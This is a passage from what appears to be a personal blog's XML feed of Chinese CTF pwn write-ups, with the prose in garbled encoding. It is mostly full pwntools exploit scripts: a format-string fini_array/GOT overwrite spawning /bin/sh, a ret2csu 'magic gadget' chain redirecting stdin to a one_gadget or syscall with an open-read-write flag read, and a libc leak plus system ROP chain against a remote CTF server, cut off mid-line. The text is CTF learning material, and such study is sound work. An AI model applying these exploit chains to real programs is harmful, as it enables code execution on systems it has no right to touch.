class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.anna.nssctf.cn&#x27;,25279)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#gdb.attach(p,&#x27;b* 0x080485A8&#x27;)</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">printf=elf.got[&#x27;printf&#x27;]</span><br><span class="line">fini_array=0x0804979C</span><br><span class="line">system=0x080483D0</span><br><span class="line">main=0x08048534</span><br><span class="line">gdb.attach(p, &#x27;b *0x804859E&#x27;)</span><br><span class="line">pause()</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">payload =p32(fini_array+2)+p32(printf+2)+p32(printf)+p32(fini_array)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=&quot;%&quot;+str(0x0804-0x10)+&quot;c%4$hn&quot;   #0804</span><br><span class="line">payload+=&quot;%5$hn&quot;                         #0804</span><br><span class="line">payload+=&quot;%&quot;+str(0x83d0-0x0804)+&quot;c%6$hn&quot; #83d0</span><br><span class="line">payload+=&quot;%&quot;+str(0x8534-0x83d0)+&quot;c%7$hn&quot; #8534</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">sl(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fini_arrayåŠ«æŒ</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>é­”æ³•çš„gadgetğŸª„</title>
    <link href="https://www.thir0th.xyz/posts/8541dcda.html"/>
    <id>https://www.thir0th.xyz/posts/8541dcda.html</id>
    <published>2025-04-19T16:17:35.000Z</published>
    <updated>2025-05-07T08:11:55.315Z</updated>
    
    <content type="html"><![CDATA[<h1>æ¼æ´åŸç†</h1><p>ROPgadget --binary pwn | grep â€˜addâ€™</p><p>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</p><p>ç©·é€”æœ«è·¯çš„æ—¶å€™ç”¨ï¼Œå°†[rbp-0x3d]+rbxèµ‹å€¼ç»™[rbp-0x3d]ï¼Œé…åˆcsuä½¿ç”¨ã€‚æ•ˆæœç”šä½³</p><p>é€‚ç”¨ï¼šåªå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ— æ‰“å°å‡½æ•°</p><h1>åˆ©ç”¨</h1><h2 id="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</h2><p>1.æ›´æ”¹stdinä¸ºone_gadgetæˆ–è€…syscall</p><p>2.call stdin</p><h2 id="åˆ©ç”¨æ–¹æ³•">åˆ©ç”¨æ–¹æ³•</h2><h3 id="è®¡ç®—åç§»">è®¡ç®—åç§»</h3><p>æ‰¾å¯¹åº”ç‰ˆæœ¬çš„libc,è®¡ç®—ä¸stdin(bsså¤´çš„libcåœ°å€)ä¸one_gadget,syscallçš„åç§»</p><p>0xffffffffå¯¹åº”-1</p><p>stdinåç§»æŸ¥æ‰¾</p><ol><li>shift+F12åcarl+Fæœç´¢stdin ,ç¬¬ä¸€ä¸ª_IO_2_1_stdin_</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682273065-36f28678-c805-4698-84e1-43c9926105de.png" alt=""></p><ol start="2"><li>Xäº¤å‰å¼•ç”¨ï¼Œçœ‹dataæ®µ</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682363461-322438ee-979b-4565-8d16-c8bb31e1885c.png" alt=""></p><p>3.è·Ÿè¿›ï¼Œæ‰¾åˆ°åç§»</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682406367-e2a845b6-714e-453b-8dfe-2e42693bdc6f.png" alt=""></p><p>4.è®¡ç®—</p><p>0xffffffffå¯¹åº”-1ï¼Œçº¢è‰²ä¸ºstdin,è“è‰²ä¸ºone_gadget/syscall,è®¡ç®—åç§»</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682829379-e28853e5-a765-4bba-bbfa-b8ef8b97c396.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682963330-4fb9a3c7-794e-42e2-b208-7c2f0ab3dc97.png" alt=""></p><h3 id="åˆ©ç”¨å§¿åŠ¿">åˆ©ç”¨å§¿åŠ¿</h3><p>1.ç®€å•ï¼Œæ”¹stdinä¸ºone_gadgetï¼Œä¸€èˆ¬é€‰æ‹©rsi,rdxç­‰å¯„å­˜å™¨ä¸ºç©ºçš„ï¼Œå› ä¸ºcsuå¯ä»¥æ§åˆ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(one_gadget)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)+p64(csu_rear)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(stdin)+p64(csu_head)</span><br></pre></td></tr></table></figure><p>ä¸­çº§ï¼Œæ²¡åŠæ³•æ§åˆ¶rax, å¯ä»¥é€šè¿‡readæ§åˆ¶ï¼Œè¯»å…¥å­—èŠ‚æ•°=raxã€‚æ‰¾æ§åˆ¶rax=0çš„gadgetæ”¹stdinä¸ºsyscall ret è°ƒç”¨readåæ§åˆ¶rax=0x3bï¼Œè·å–shellã€‚ç”¨çš„libcä¸­çš„syscall_ret</p><p>ropper --file=/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6 --search â€œsyscallâ€</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725683449839-79a4d8ed-34de-4805-99fd-add8638ee5a8.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)</span><br><span class="line">s((<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x3b</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é«˜çº§ï¼Œæ²™ç›’ï¼Œç±»ä¼¼çš„ç”¨æ³•ï¼Œé€šè¿‡readæ§åˆ¶raxï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œorwï¼Œè¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722692324147-d6eba25e-5434-4e1c-bd9d-fb9a3283b96f.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">magic=<span class="number">0x000000000040113c</span></span><br><span class="line">csu_head=<span class="number">0x401240</span> </span><br><span class="line">csu_rear=<span class="number">0x40125A</span></span><br><span class="line">stdin=<span class="number">0x404020</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) </span><br><span class="line">payload+=p64(csu_head)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffef7184)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)+p64(csu_rear)+p64(0)*5+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffe76729)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(0)+p64(stdin+0x400)+p64(0x100)+p64(elf.got[&#x27;read&#x27;])+p64(csu_head)+p64(0)*7</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(stdin+0x400)+p64(0)+p64(0)+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0xffe76729</span>)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">é­”æ³•çš„gadgetğŸª„</summary>
    
    
    
    <category term="Magic" scheme="https://www.thir0th.xyz/categories/Magic/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025HGAME</title>
    <link href="https://www.thir0th.xyz/posts/54319d4e.html"/>
    <id>https://www.thir0th.xyz/posts/54319d4e.html</id>
    <published>2025-04-19T16:12:35.000Z</published>
    <updated>2025-04-19T16:35:48.873Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2025hgame">2025hgame</h2><p>å»å¹´çš„å”¯å”¯è¯ºè¯ºï¼Œä»Šå¹´çš„é‡æ‹³å‡ºå‡»ğŸ˜</p><h3 id="week1">week1</h3><h4 id="format">format</h4><p>æ— æ•°æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ä¸€æ¬¡åªæœ‰ä¸‰ä¸ªå­—èŠ‚ï¼Œvulnå¯ä»¥ç›´æ¥ç”¨-1ç»•è¿‡ï¼Œå…³é”®æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºlibcåœ°å€</p><p>å¯ä»¥ç”¨%*d+%sæ¥æ³„éœ²libcåœ°å€ï¼Œåç»­ç›´æ¥æ‰“systemçš„ropé“¾å­</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888731147-3eab4294-7d2c-45a2-bdbc-4cabf401b143.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888590185-0e8c91bc-89e9-42f8-95d7-7460bff37e1c.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31079)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def cmd(a):</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(a)</span><br><span class="line"></span><br><span class="line">rl(&quot;you have n chance to getshell\n n = &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%*d&#x27;)</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%s&#x27;)</span><br><span class="line">libc_base=get_addr64()-2206368</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span 